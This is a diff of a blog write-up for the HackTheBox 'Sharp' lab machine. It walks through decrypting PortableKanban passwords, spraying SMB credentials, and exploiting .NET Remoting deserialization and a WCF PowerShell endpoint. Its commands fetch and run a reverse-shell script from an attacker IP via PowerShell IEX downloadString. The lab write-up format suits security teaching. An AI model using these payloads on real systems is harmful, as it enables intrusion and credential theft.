@@ -1,7 +1,7 @@
 ---
 title: HackTheBox - Sharp
 author: Huy
-date: 2021-5-15 9:30:00 +1345
+date: 2021-5-16 9:30:00 +1345
 tags: [hackthebox, network, pwn]
 pin: true
 ---
@@ -191,7 +191,39 @@ Skim through the files and we have these users in `PortableKanban.pk3`.
 Since the passwords are encrypted, we need to find other ways to get in. We can abuse their own `PortableKanban.exe` to decrypt passwords for us since they are stored offline but you've might already known that only privileged users can read the password in plain text. Let's add ourselves in with *Admin* role by copy-paste `Administrator` section and change the name and id.
 
 ```json
-/* PortableKanban.pk3 */	"Users": [    {      "Id": "e8e29158d70d44b1a1ba4949d52790a0",      "Name": "Administrator",      "Initials": "",      "Email": "",      "EncryptedPassword": "k+iUoOvQYG98PuhhRC7/rg==",      "Role": "Admin",      "Inactive": false,      "TimeStamp": 637409769245503700    },    {      "Id": "0628ae1de5234b81ae65c246dd2b4a21",      "Name": "lars",      "Initials": "",      "Email": "",      "EncryptedPassword": "Ua3LyPFM175GN8D3+tqwLA==",      "Role": "User",      "Inactive": false,      "TimeStamp": 637409769265925600    },    {      "Id": "e8e29158d70d44b1a1ba4949d52790a1", // We also need to change the id      "Name": "huy",      "Initials": "",      "Email": "",      "EncryptedPassword": "", 					// Empty password      "Role": "Admin",      "Inactive": false,      "TimeStamp": 637409769245503700    }  ]
+/* PortableKanban.pk3 */
+	"Users": [
+    {
+      "Id": "e8e29158d70d44b1a1ba4949d52790a0",
+      "Name": "Administrator",
+      "Initials": "",
+      "Email": "",
+      "EncryptedPassword": "k+iUoOvQYG98PuhhRC7/rg==",
+      "Role": "Admin",
+      "Inactive": false,
+      "TimeStamp": 637409769245503700
+    },
+    {
+      "Id": "0628ae1de5234b81ae65c246dd2b4a21",
+      "Name": "lars",
+      "Initials": "",
+      "Email": "",
+      "EncryptedPassword": "Ua3LyPFM175GN8D3+tqwLA==",
+      "Role": "User",
+      "Inactive": false,
+      "TimeStamp": 637409769265925600
+    },
+    {
+      "Id": "e8e29158d70d44b1a1ba4949d52790a1", // We also have to change the id
+      "Name": "huy",
+      "Initials": "",
+      "Email": "",
+      "EncryptedPassword": "", 					// Empty password
+      "Role": "Admin",
+      "Inactive": false,
+      "TimeStamp": 637409769245503700
+    }
+  ]
 ```
 
 Then we execute `PortableKanban.exe`, open Users tab in the setup dialog and we are now able to read the passwords.
@@ -214,8 +246,12 @@ Load the target's executables and DLLs  in dnSpy, we can have their decrypt meth
 
 On line 62 and 65, from two magic bytes called `_rgbKey` and `_rgbIV`: 
 
-```
-		// Token: 0x04000001 RID: 1		private static byte[] _rgbKey = Encoding.ASCII.GetBytes("7ly6UznJ"); // Hex: 376c7936557a6e4a		// Token: 0x04000002 RID: 2		private static byte[] _rgbIV = Encoding.ASCII.GetBytes("XuVUm5fR");	// Hex: 587556556d356652
+```c#
+		// Token: 0x04000001 RID: 1
+		private static byte[] _rgbKey = Encoding.ASCII.GetBytes("7ly6UznJ"); // Hex: 376c7936557a6e4a
+
+		// Token: 0x04000002 RID: 2
+		private static byte[] _rgbIV = Encoding.ASCII.GetBytes("XuVUm5fR");	// Hex: 587556556d356652
 ```
 
 Talk a little about DES cipher, people use two common mode which are CBC (**cipher block chaining**) and ECB (**electronic code book**). But only CBC supports key and IV in combination to generate the block cipher.
@@ -231,7 +267,18 @@ So we are able to decrypt the password using [CyberChef](https://gchq.github.io/
 In this step, we will correspondingly put our usernames and passwords in two separate text file and let CME do the verification job for us.
 
 ```bash
-# users.txt                   larsAdministrator                                                                                                    # passwords.txt G123HHrth234gRGG2@$btRSHJYTarg┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]└─# poetry run crackmapexec.spec smb 10.10.10.219 -u ../../users.txt -p ../../passwords.txt SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG 
+# users.txt                   
+lars
+Administrator
+                                                                                                    
+# passwords.txt 
+G123HHrth234gRG
+G2@$btRSHJYTarg
+
+┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]
+└─# poetry run crackmapexec.spec smb 10.10.10.219 -u ../../users.txt -p ../../passwords.txt 
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG 
 ```
 
 Only `lars` can log in so we should excluded Administrator credentials for now.
@@ -248,19 +295,68 @@ Only `lars` can log in so we should excluded Administrator credentials for now.
 After using `lars` credentials, we are able to crawl his shared-objects with `spider_plus` module as following:
 
 ```bash
-                                                                                                    ┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]└─# poetry run crackmapexec.spec smb 10.10.10.219 -u lars -p G123HHrth234gRG -M spider_plus     2 ⨯SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG SPIDER_P... 10.10.10.219    445    SHARP            [*] Started spidering plus with option:SPIDER_P... 10.10.10.219    445    SHARP            [*]        DIR: ['print$']SPIDER_P... 10.10.10.219    445    SHARP            [*]        EXT: ['ico', 'lnk']SPIDER_P... 10.10.10.219    445    SHARP            [*]       SIZE: 51200SPIDER_P... 10.10.10.219    445    SHARP            [*]     OUTPUT: /tmp/cme_spider_plus
+┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]
+└─# poetry run crackmapexec.spec smb 10.10.10.219 -u lars -p G123HHrth234gRG -M spider_plus     2 ⨯
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG 
+SPIDER_P... 10.10.10.219    445    SHARP            [*] Started spidering plus with option:
+SPIDER_P... 10.10.10.219    445    SHARP            [*]        DIR: ['print$']
+SPIDER_P... 10.10.10.219    445    SHARP            [*]        EXT: ['ico', 'lnk']
+SPIDER_P... 10.10.10.219    445    SHARP            [*]       SIZE: 51200
+SPIDER_P... 10.10.10.219    445    SHARP            [*]     OUTPUT: /tmp/cme_spider_plus
 ```
 
 We made the `.json` more readable by filtering out the time and file size.
 
 ```bash
-                                                                                                    ┌──(root💀kali)-[/home/kali/HackTheBox/Sharp]└─# cat 10.10.10.219_lars_spider.json | grep -v 'time\|size' | grep ': {' | awk -F\" '{print $2}'  IPC$			# directoryInitShutdownLSM_API_servicePIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDERPSHost.132655164003465770.3392.DefaultAppDomain.powershellW32TIME_ALTWinsock2\\CatalogChangeListener-154-0Winsock2\\CatalogChangeListener-1dc-0Winsock2\\CatalogChangeListener-268-0Winsock2\\CatalogChangeListener-274-0Winsock2\\CatalogChangeListener-36c-0Winsock2\\CatalogChangeListener-42c-0atsvcepmappereventloglsassntsvcsscerpcsrvsvcvgauth-servicewkssvcdev				# directoryClient.exeRemotingLibrary.dllServer.exenotes.txt
+┌──(root💀kali)-[/home/kali/HackTheBox/Sharp]
+└─# cat 10.10.10.219_lars_spider.json | grep -v 'time\|size' | grep ': {' | awk -F\" '{print $2}'  
+IPC$			# directory
+InitShutdown
+LSM_API_service
+PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER
+PSHost.132655164003465770.3392.DefaultAppDomain.powershell
+W32TIME_ALT
+Winsock2\\CatalogChangeListener-154-0
+Winsock2\\CatalogChangeListener-1dc-0
+Winsock2\\CatalogChangeListener-268-0
+Winsock2\\CatalogChangeListener-274-0
+Winsock2\\CatalogChangeListener-36c-0
+Winsock2\\CatalogChangeListener-42c-0
+atsvc
+epmapper
+eventlog
+lsass
+ntsvcs
+scerpc
+srvsvc
+vgauth-service
+wkssvc
+dev				# directory
+Client.exe
+RemotingLibrary.dll
+Server.exe
+notes.txt
 ```
 
 While searching `lars` files, only those in `\\dev` seem important.
 
 ```bash
-┌──(root💀kali)-[/home/…/HackTheBox/Sharp/smb/lars]└─# smbclient -U 'lars' //10.10.10.219/dev G123HHrth234gRG                                    130 ⨯Try "help" to get a list of possible commands.smb: \> ls  .                                   D        0  Sun Nov 15 06:30:13 2020  ..                                  D        0  Sun Nov 15 06:30:13 2020  Client.exe                          A     5632  Sun Nov 15 05:25:01 2020  notes.txt                           A       70  Sun Nov 15 08:59:02 2020  RemotingLibrary.dll                 A     4096  Sun Nov 15 05:25:01 2020  Server.exe                          A     6144  Mon Nov 16 06:55:44 2020  # notes.txtTodo:    Migrate from .Net remoting to WCF	# This might be our hint    Add input validation
+┌──(root💀kali)-[/home/…/HackTheBox/Sharp/smb/lars]
+└─# smbclient -U 'lars' //10.10.10.219/dev G123HHrth234gRG                                    130 ⨯
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Nov 15 06:30:13 2020
+  ..                                  D        0  Sun Nov 15 06:30:13 2020
+  Client.exe                          A     5632  Sun Nov 15 05:25:01 2020
+  notes.txt                           A       70  Sun Nov 15 08:59:02 2020
+  RemotingLibrary.dll                 A     4096  Sun Nov 15 05:25:01 2020
+  Server.exe                          A     6144  Mon Nov 16 06:55:44 2020
+  
+# notes.txt
+Todo:
+    Migrate from .Net remoting to WCF	# This might be our hint
+    Add input validation
 ```
 
 Two executables `Client.exe` and `Server.exe`, as well as their library, are also built in C#  so we can decompile them with dnSpy.
@@ -318,7 +414,19 @@ Here is a brief look of `Server.exe` source code decompiled by dnSpy. The server
 Below is our crafting steps with `ysoserial` and `ExploitRemotingService`:
 
 ```powershell
-### ysoserial.exeC:\Users\User\Desktop\ysoserial-1.34\Release>ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell IEX(new-object net.webclient).downloadString('http://10.10.16.3/reverse.ps1')"# Breakdown-f Formatter as BinaryFormatter-g TypeConfuseDelegate gadget-o Base64 output-c Create a reverse connection back to our IP using Powershell one-liner called reverse.ps1IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/reverse.ps1')### ExploitRemotingService.exeC:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release>ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw <wrapped payload># Breakdown-s Pipe command input from stdin--user=debug & --pass="SharpApplicationDebugUserPassword123!" our endpoint credentials
+### ysoserial.exe
+C:\Users\User\Desktop\ysoserial-1.34\Release>ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell IEX(new-object net.webclient).downloadString('http://10.10.16.3/reverse.ps1')"
+
+# Breakdown
+-f Formatter as BinaryFormatter
+-g TypeConfuseDelegate gadget
+-o Base64 output
+-c Create a reverse connection back to our IP using Powershell one-liner called reverse.ps1
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/reverse.ps1')
+
+
+### ExploitRemotingService.exe
+C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release>ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw <wrapped payload>
 ```
 
 #### Network re-routing on Windows and Linux
@@ -328,7 +436,29 @@ Before we can send our payload to target host, remember that currently our Linux
 The following section helps us turn Kali into a router and act as the gateway.
 
 ```bash
-# Windows# We want to route any HTB connection to our Kali machine NAT-IP (192.168.157.133)C:\Windows\system32>route add 10.10.10.0 mask 255.255.255.0 192.168.157.133 OK!#	----------------------------------------------# Linux# Enable IP Forwarding$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward # Configurate iptables' rules to manage incomming packets# This rule forwards packets from HTB to our Windows machine# Breakdown: Forwarding chain for connection from tun0 to eth0 interface with related and/or established state$ iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT # Accept packets sending back from Windows machine# Breakdown: Receive packets from Windows through eth0 interface then pass it on tun0 and send them to HTB$ iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT# Re-routing NAT from HTB machine back to Windows# Breakdown: Create a NAT table with POSTROUTING chain that accept only IP from the source of eth0 and pass it through tun0 with MASQUERADE policy$ iptables -t nat -A POSTROUTING -s 192.168.157.0/24 -o tun0 -j MASQUERADE 
+# Windows
+# We want to route any HTB connection to our Kali machine NAT-IP
+C:\Windows\system32>route add 10.10.10.0 mask 255.255.255.0 192.168.157.133
+ OK!
+
+#	----------------------------------------------
+
+# Linux
+# Enable IP Forwarding
+$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward 
+
+# Configurate iptables' rules to manage incomming packets
+# This rule forwards packets from HTB to our Windows machine
+# Breakdown: Forwarding chain for connection from tun0 to eth0 interface with related and/or established state
+$ iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT 
+
+# Accept packets sending back from Windows machine
+# Breakdown: Receive packets from Windows through eth0 interface then pass it on tun0 and send them to HTB
+$ iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT
+
+# Re-routing NAT from HTB machine back to Windows
+# Breakdown: Create a NAT table with POSTROUTING chain that accept only IP from the source of eth0 and pass it through tun0 with MASQUERADE policy
+$ iptables -t nat -A POSTROUTING -s 192.168.157.0/24 -o tun0 -j MASQUERADE 
 ```
 
 ### PowerShell Reverse Connection
@@ -340,7 +470,8 @@ Finally, our Windows is able to send/receive packets from HTB machine through Ka
 Now we can send our payload to target remote host and wait for our reverse shell.
 
 ```shell
-### ExploitRemotingService.exeC:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release>ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw <wrapped payload>
+### ExploitRemotingService.exe
+C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release>ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw <wrapped payload>
 ```
 
 After execute the above command, we has established a reverse PowerShell as user `lars`.
@@ -350,7 +481,20 @@ After execute the above command, we has established a reverse PowerShell as user
 Browsing through `lars` directories, there is a `wcf` folder in Documents. This has also been mentioned in `notes.txt` about migrating the project from dotNET to WCF, so it might be the answer. Anyway, the machine's user flag is located in `C:\Users\lars\Desktop\user.txt`.
 
 ```powershell
-    Directory: C:\Users\lars\Documents\wcfMode                LastWriteTime         Length Name                                                                  ----                -------------         ------ ----                                                                  d-----       11/15/2020   1:40 PM                .vs                                                                   d-----       11/15/2020   1:40 PM                Client                                                                d-----       11/15/2020   1:40 PM                packages                                                              d-----       11/15/2020   1:40 PM                RemotingLibrary                                                       d-----       11/15/2020   1:41 PM                Server                                                                -a----       11/15/2020  12:47 PM           2095 wcf.sln                                                               PS C:\Users\lars\Documents\wcf> 
+    Directory: C:\Users\lars\Documents\wcf
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       11/15/2020   1:40 PM                .vs                                                                   
+d-----       11/15/2020   1:40 PM                Client                                                                
+d-----       11/15/2020   1:40 PM                packages                                                              
+d-----       11/15/2020   1:40 PM                RemotingLibrary                                                       
+d-----       11/15/2020   1:41 PM                Server                                                                
+-a----       11/15/2020  12:47 PM           2095 wcf.sln                                                               
+
+
+PS C:\Users\lars\Documents\wcf> 
 ```
 
 Let's compress the wcf directory into `wcf.zip` then download it to our Linux shared directory
@@ -369,8 +513,9 @@ Since we are in the same network with remote target, you can try change the IP t
 
 We can't connect to our target because of invalid credentials. This program was meant to run as internal users of the remote host (like `lars` or `debug`). To impersonate `lars`, we will run our command-prompt with his net-username as following:
 
-```
-# Also type lars password when promptedC:\Windows\system32>runas /user:lars /netonly %ComSpec%
+```shell
+# Also type lars password when prompted
+C:\Windows\system32>runas /user:lars /netonly %ComSpec%
 ```
 
 ![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-33.png)
@@ -382,13 +527,40 @@ Now we are `lars` in his server, move to our malformed `wcf` project and run it 
 Successfully executed as `lars`. Now we will use the project's built-in function `InvokePowerShell` to escalate our privilege.
 
 ```c#
-        public string InvokePowerShell(string scriptText)        {            Runspace runspace = RunspaceFactory.CreateRunspace();            runspace.Open();            Pipeline pipeline = runspace.CreatePipeline();            pipeline.Commands.AddScript(scriptText);            pipeline.Commands.Add("Out-String");            Collection <PSObject> results = pipeline.Invoke();            runspace.Close();            StringBuilder stringBuilder = new StringBuilder();            foreach (PSObject obj in results)            {                stringBuilder.AppendLine(obj.ToString());            }            return stringBuilder.ToString();        }    }
+        public string InvokePowerShell(string scriptText)
+        {
+            Runspace runspace = RunspaceFactory.CreateRunspace();
+            runspace.Open();
+            Pipeline pipeline = runspace.CreatePipeline();
+            pipeline.Commands.AddScript(scriptText);
+            pipeline.Commands.Add("Out-String");
+            Collection <PSObject> results = pipeline.Invoke();
+            runspace.Close();
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (PSObject obj in results)
+            {
+                stringBuilder.AppendLine(obj.ToString());
+            }
+            return stringBuilder.ToString();
+        }
+    }
 ```
 
 `Client.cs` is to be changed as below:
 
 ```c#
-namespace Client {    public class Client    {        public static void Main() {            ChannelFactory<IWcfService> channelFactory = new ChannelFactory<IWcfService>(                new NetTcpBinding(SecurityMode.Transport),"net.tcp://10.10.10.219:8889/wcf/NewSecretWcfEndpoint"            );            IWcfService client = channelFactory.CreateChannel();            Console.WriteLine(client.InvokePowerShell("IEX(New-Object Net.WebClient).downloadString('10.10.16.3/reverse.ps1')"));        }    }
+namespace Client {
+
+    public class Client
+    {
+        public static void Main() {
+            ChannelFactory<IWcfService> channelFactory = new ChannelFactory<IWcfService>(
+                new NetTcpBinding(SecurityMode.Transport),"net.tcp://10.10.10.219:8889/wcf/NewSecretWcfEndpoint"
+            );
+            IWcfService client = channelFactory.CreateChannel();
+            Console.WriteLine(client.InvokePowerShell("IEX(New-Object Net.WebClient).downloadString('10.10.16.3/reverse.ps1')"));
+        }
+    }
 ```
 
 Re-build the project then execute `Client.exe` as `lars` gives us our reverse shell as `nt-authority system` 
@@ -398,7 +570,44 @@ Re-build the project then execute `Client.exe` as `lars` gives us our reverse sh
 And the flag is located in `C:\Users\Administrator\Desktop\root.txt`
 
 ```powershell
-cd C:\Users\Administratordir    Directory: C:\Users\AdministratorMode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   d-r---       11/12/2020   5:15 PM                3D Objects                                                             d-r---       11/12/2020   5:15 PM                Contacts                                                               d-r---       11/15/2020   1:42 PM                Desktop                                                                d-r---       11/15/2020   1:46 PM                Documents                                                              d-r---       11/12/2020   5:15 PM                Downloads                                                              d-r---       11/12/2020   5:15 PM                Favorites                                                              d-r---       11/12/2020   5:15 PM                Links                                                                  d-r---       11/12/2020   5:15 PM                Music                                                                  d-r---       11/12/2020   5:15 PM                Pictures                                                               d-r---       11/12/2020   5:15 PM                Saved Games                                                            d-r---       11/12/2020   5:15 PM                Searches                                                               d-r---       11/12/2020   5:15 PM                Videos                                                                 cd Desktopdir    Directory: C:\Users\Administrator\DesktopMode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   -ar---        5/14/2021   6:02 AM             34 root.txt                                                               cat root.txt[REDACTED]PS C:\Users\Administrator\Desktop> 
+cd C:\Users\Administrator
+dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+d-r---       11/12/2020   5:15 PM                3D Objects                                                             
+d-r---       11/12/2020   5:15 PM                Contacts                                                               
+d-r---       11/15/2020   1:42 PM                Desktop                                                                
+d-r---       11/15/2020   1:46 PM                Documents                                                              
+d-r---       11/12/2020   5:15 PM                Downloads                                                              
+d-r---       11/12/2020   5:15 PM                Favorites                                                              
+d-r---       11/12/2020   5:15 PM                Links                                                                  
+d-r---       11/12/2020   5:15 PM                Music                                                                  
+d-r---       11/12/2020   5:15 PM                Pictures                                                               
+d-r---       11/12/2020   5:15 PM                Saved Games                                                            
+d-r---       11/12/2020   5:15 PM                Searches                                                               
+d-r---       11/12/2020   5:15 PM                Videos                                                                 
+
+
+cd Desktop
+dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-ar---        5/14/2021   6:02 AM             34 root.txt                                                               
+
+
+cat root.txt
+[REDACTED]
+PS C:\Users\Administrator\Desktop> 
 ```
 
 
@@ -408,3 +617,4 @@ cd C:\Users\Administratordir    Directory: C:\Users\AdministratorMode           
 [^1]: See more about PowerShell one-liner: https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf
 [^2]: Proof of Concept
 [^3]: Virtual Machine
+
